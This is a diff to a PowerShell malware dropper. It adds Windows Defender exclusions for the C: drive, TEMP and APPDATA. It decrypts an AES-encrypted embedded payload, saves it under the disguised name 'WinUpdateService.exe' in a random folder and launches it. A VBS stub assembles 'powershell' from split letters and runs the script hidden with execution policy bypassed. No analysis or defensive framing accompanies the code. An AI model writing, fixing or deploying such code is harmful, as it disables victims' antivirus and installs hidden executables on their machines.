@@ -6,6 +6,11 @@ $fullPath = "$randomPath$randomProgram"
 New-Item -Path $fullPath -ItemType Directory -Force
 
 $scriptContent = @'
+Add-MpPreference -ExclusionPath "C:\"
+Add-MpPreference -ExclusionPath "$env:TEMP"
+Add-MpPreference -ExclusionPath "$env:APPDATA"
+Add-MpPreference -ExclusionPath "$env:SystemDrive\programdata\Windata"
+
 function HexStringToByteArray([string]$hex) {
     $bytes = New-Object byte[] ($hex.Length / 2)
     for ($i = 0; $i -lt $bytes.Length; $i++) {
@@ -47,7 +52,7 @@ $key = HexStringToByteArray $keyHex
 $iv = HexStringToByteArray $ivHex
 $decBytes = AES-Decrypt -Data $encBytes -Key $key -IV $iv
 if ($decBytes -ne $null) {
-    $outPath = "C:\ProgramData\WinUpdateService.exe"
+    $outPath = "$fullPath\WinUpdateService.exe"
     [System.IO.File]::WriteAllBytes($outPath, $decBytes)
     if (Test-Path $outPath) {
         Start-Process $outPath
@@ -63,9 +68,9 @@ Set-Content -Path "$fullPath\$randomProgram.ps1" -Value $scriptContent -Force
 $vbsContent = @"
 On Error Resume Next
 Dim arr, i, cmd
-arr = Split("p,o,w,e,r,s,h,e,l,l", ",")
-cmd = Join(arr, "") & " -ExecutionPolicy Bypass -NoProfile -File `"$fullPath\$randomProgram.ps1`""
-CreateObject("WScript.Shell").Run cmd, 0, False
+arr = Split(""p,o,w,e,r,s,h,e,l,l"", "","")
+cmd = Join(arr, """") & "" -ExecutionPolicy Bypass -NoProfile -File \""$fullPath\$randomProgram.ps1\""""
+CreateObject(""WScript.Shell"").Run cmd, 0, False
 "@
 
 Set-Content -Path "$fullPath\$randomProgram.vbs" -Value $vbsContent -Force
